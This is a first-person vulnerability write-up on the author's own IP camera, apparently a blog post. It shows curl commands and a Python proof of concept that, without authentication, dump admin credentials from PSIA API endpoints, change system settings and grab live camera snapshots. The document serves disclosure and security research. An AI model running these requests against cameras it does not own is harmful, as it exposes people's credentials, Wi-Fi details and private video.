### Introduction
I didn't buy this camera to break into it.

We got it a while ago, set it up, used it like any normal cheap IP camera. Back then I didn't really have the skills to look into how it actually worked. It was just "plug it in, open the app, streams video".

Today, I got bored and remembered it. Same camera, same network, just a bit more knowledge. So I figured I'd take a look at it properly.

### First Look
I started with a simple scan:
```
nmap -sV -p- 192.168.0.115
```

What came back was already interesting. It wasn't just a web interface:
- Telnet open (BusyBox)
- HTTP / HTTPS
- RTSP on 8554
- A bunch of weird high ports
- Snapshot endpoints on 6688


That's already more surface than a "simple camera" should realistically expose.

### The Web Interface
Opening the web panel didn't give much at first. Basic login page, nothing special.

![Landing Page](/blog-posts/home-camera-research/web-panel-landing-page.png)

But when I pulled the front-end files (`/doc/page` and `/doc/script`), things started to make more sense.

The login logic lives in JavaScript, and it literally sends credentials like this:
`GET /PSIA/YG/userCheck?userName=<user>&password=<pass>`
No hashing, no challenge, nothing. Just plain credentials over HTTPS.

That alone is bad, but it gets worse.

### Weird Stuff in Frontend
While reading the login script, I noticed a hard-coded check:
- If the username is `super_yg`, it skips part of the normal login flow and jumps straight into the UI logic.
That doesn't automatically mean admin access, but it tells you one thing:
- There are shortcuts baked into the frontend that shouldn't exist.
At this point it was obvious the backend probably isn't doing much validation either.

### API Exploration
The camera exposes a bunch of endpoints under `/PSIA/`.

So normally, I started poking at them directly with `curl`, without logging in.

For example:
```bash
curl http://192.168.0.115/PSIA/YG/system/time
```

The Output:
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<Time version="1.0" xmlns="urn:psialliance-org">
	<timeMode>NTP</timeMode>
	<localTime>2026-03-31T05:25:34</localTime>
	<timeZone>CST-08:00:00</timeZone>
</Time>
```

It returned valid data. No authentication though. :(

At that point I didn't immediately jump to sensitive stuff. I started just poking around to see how much of the API was exposed.

Tried a few more endpoints:
- `/PSIA/System/deviceInfo`
- `/PSIA/System/Network/interfaces`
- `/PSIA/YG/netWork/wireless`
- `/PSIA/YG/netWork/getAllPort`
- `/PSIA/YG/system/time`
All of them responded with actual data. Still though, no authentication. :(

That's when it became clear that this wasn't just a misconfigured endpoint, the API itself was straight up not enforcing authentication properly.

So I kept going and tried something more sensitive. That’s when things got interesting.

`/PSIA/Security/AAA/users/`

Anything with `AAA (Authentication, Authorization, Accounting)` is usually sensitive. This being the most important find so far, I of course tried it.

### The "Oh sh*t" moment
```bash
curl http://192.168.0.115/PSIA/Security/AAA/users
```

What I got was IN PLAIN TEXT. No authentication. Nothing. And the response? It straight up returned credentials.

```xml

	<max_user>10</max_user>

		<userType>admin</userType>
	</User>
```

Plaintext. At this point it went from "the API is loose" to "oh god they don't care about it".

### It Gets Worse
At this point I had:
- Admin credentials
- Full read access

It started as "how far can I go?" and quickly turned into "how much more does this thing let me do?"

So I tested a harmless write:
```bash
curl -X PUT http://192.168.0.115/PSIA/YG/system/time \  
-H "Content-Type: application/xml" \  
--data '<Time><timeMode>manual</timeMode><localTime>2026-03-30T22:42:30</localTime></Time>'
```

Response:
```bash
200 OK
```

No authentication. 

Not only:
- There's no authentication for reading sensitive data
- There's no authentication for modifying system state

Game over.

### Camera Feed
Remember port `6688` from the scan?

```bash
curl http://192.168.0.115:6688/snapshot.jpg
```

That returns a live snapshot from the camera. No authentication... of course.

### Now what?
Without logging in properly, I was able to:
- Dump admin credentials
- Read network configuration (including Wi-Fi)
- Access live camera snapshots
- Modify system settings
- Interact with camera control endpoints

All from a completely unauthenticated position.

### Proof of Concept (Mostly automation)
At this point, everything I did was done manually, but honestly, where would we be if we didn't over-engineer everything we do? If you can do it once with `curl`, why not automate it with a few lines of Python?

What the PoC does:
- Dumps users (including credentials)
- Fetches device information
- Grabs a live snapshot (not included in the report for obvious reasons)

```python
import requests

TARGET = "http://192.168.0.115"

endpoints = {
	"users": "/PSIA/Security/AAA/users",
	"device_info": "/PSIA/System/deviceInfo",
	"snapshot": ":6688/snapshot.jpg"
}

def fetch(path):
	try:
		r = requests.get(TARGET + path, timeout=5)
		return r.text if r.status_code == 200 else f"[!] Failed ({r.status_code})"
	except Exception as e:
		return f"[!] Error: {e}"

  
print("[+] Dumping users...")
print(fetch(endpoints["users"]))

print("\n[+] Fetching device info...")
print(fetch(endpoints["device_info"]))

print("\n[+] Saving snapshot...")
try:
	r = requests.get(TARGET + endpoints["snapshot"], timeout=5)

	if r.status_code == 200:
		with open("snapshot.jpg", "wb") as f:
			f.write(r.content)
		print("[+] Snapshot saved as snapshot.jpg")
	else:
		print(f"[!] Snapshot failed ({r.status_code})")
except Exception as e:
	print(f"[!] Error: {e}")
```

### Final Thoughts & Real World Impact
What I did wasn't some advanced exploit. There was no memory corruption or any fancy bypass.

Just:
- Read the frontend
- Extract endpoints
- Call them directly

And everything falls apart. It's easy to look at this and say "yeah but it's just a cheap camera why overthink this". Put it in a real scenario:
- Someone exposes this device to the internet (port forwarding, bad UPnP, whatever)
- Or someone is already inside the network

At that point:
- Your camera feed is public
- Your Wi-Fi credentials are exposed
- Your device can be modified or reset
- And you wouldn't even know

I'm fully aware this is older firmware, but that's kind of the problem. Devices like these stay in homes, and small offices without ever getting updated.

### Vulnerability Summary  
Unauthenticated access to sensitive API endpoints allows attackers to:  
- Retrieve credentials  
- Access live camera feeds  
- Modify system configuration

### Vulnerability Classification
The issues observed map to multiple common weakness classes:
- **CWE-306** – Missing Authentication for Critical Function
- **CWE-522** – Insufficiently Protected Credentials
- **CWE-284** – Improper Access Control
- **CWE-319** – Cleartext Transmission of Sensitive Information
